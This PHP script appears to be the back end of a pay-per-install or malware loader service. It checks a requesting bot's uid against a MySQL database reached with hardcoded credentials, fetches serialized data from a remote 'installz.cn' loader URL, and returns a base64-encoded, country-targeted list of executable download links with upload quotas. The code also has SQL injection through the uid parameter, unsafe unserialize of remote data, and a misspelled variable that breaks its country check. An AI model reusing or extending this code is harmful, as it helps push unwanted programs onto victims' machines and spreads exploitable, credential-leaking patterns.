<?php
if (!($uid = @$_REQUEST['uid'])) die();

function _encrypt($str, $key) {
    for ($i = 0; $i < strlen($str); $i++){
        $r = ord($str[$i]) ^ $key;            
        if (!$r || ($r == $key)) 
            $r = $key;            
        $str[$i] = chr($r);
    } 
    return $str;
}

$config = array(	
	'host' => '74.54.241.116',
	'user' => 'yabucks',
	'pass' => '03hsdSoN',
	'db'   => 'yabucks');

	
$conn = @mysql_connect($config['host'], $config['user'], $config['pass']) or die(mysql_error());
        @mysql_select_db($config['db'], $conn) or die(mysql_error($conn));

$content = file_get_contents('http://installz.cn/loaders/xor');
$options = unserialize($content);

$sql = 'SELECT * FROM `users` WHERE uid = \''.$uid.'\'';
if (mysql_num_rows(($statement = mysql_query($sql, $conn)))) {// exist case
    $user = mysql_fetch_array($statement, MYSQL_ASSOC);
    if ($user['is_active']) { // active case
        $_SERVER['REMOTE_ADDR'] = '209.222.78.162';	     
        require_once('lib/Geoip/geoip.inc');
        $gi = geoip_open("lib/Geoip/GeoIP.dat", GEOIP_STANDARD);
        $country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
        
        //load config
        $sql = 'SELECT * FROM `config`';
        $statement = mysql_query($sql, $conn) or die(mysql_error($conn));
        $config = array();
        while (($row = mysql_fetch_array($statement, MYSQL_ASSOC))) {
            $config[$row['name']] = unserialize($row['value']);
        }
        
        //build programs list
        $sql = 'SELECT `programs`.*
			FROM `programs` INNER JOIN `programs-groups`
 			ON `programs`.`group` = `programs-groups`.`id`
			WHERE 
				`programs`.`status` = \'enabled\' AND
				`programs-groups`.`countries` LIKE \'%'.$country.'%\'
			ORDER BY `programs`.`position` ASC
		';        
        $statement = mysql_query($sql, $conn) or die(mysql_error($conn));
        $programs  = '';
        while (($row = mysql_fetch_array($statement,MYSQL_ASSOC))) {
            $sql = 'SELECT SUM(`programs-stat`.`value`) AS sum
				FROM `programs-stat`
				WHERE `programs-stat`.`program` = \''.$row['id'].'\'
				GROUP BY `programs-stat`.`program`';
            $statement1 = mysql_query($sql, $conn) or die(mysql_error($conn));
            $stat = mysql_fetch_array($statement1, MYSQL_ASSOC);
            if ($stat['sum'] >= $row['total_uploads']) { // total uploads case
                continue;
            }
            
            $sql = 'SELECT SUM(`programs-stat`.`value`) AS sum
				FROM `programs-stat`
				WHERE `programs-stat`.`program` = \''.$row['id'].'\' AND 
					`programs-stat`.`date` = \''.date('Y-m-d').'\'
				GROUP BY `programs-stat`.`program`';
            $statement1 = mysql_query($sql, $conn) or die(mysql_error($conn));
            $stat = mysql_fetch_array($statement1, MYSQL_ASSOC);
            if ($stat['sum'] >= $row['day_uploads']) { // day uploads case
                continue;
            }
            
            $programs .= '1_'.$row['id'].' '.'http://'.trim($config['ftp_domain'], '/').'/'.$row['program'].' '.$row['program']."\r\n";
        }   
        
        //add unique exe        
        if (in_array($conuntry, 
            array('AU','CA', 'DE', 'ES', 'FR', 'GB', 'HK', 'IE', 'IT', 'NL', 'US'))) {
            $programs .= '0_0 http://'.trim($config['renew_url'], '/').'/download/1/'.$user['extuid1'].'/0 ext'."\r\n";
        } else
            $programs .= '0_0 http://'.trim($config['renew_url'], '/').'/download/1/'.$user['extuid2'].'/0 ext'."\r\n";        

        echo base64_encode($programs);       
        //echo $programs;
        die(); 
    } else die(); // disabled case
}


?>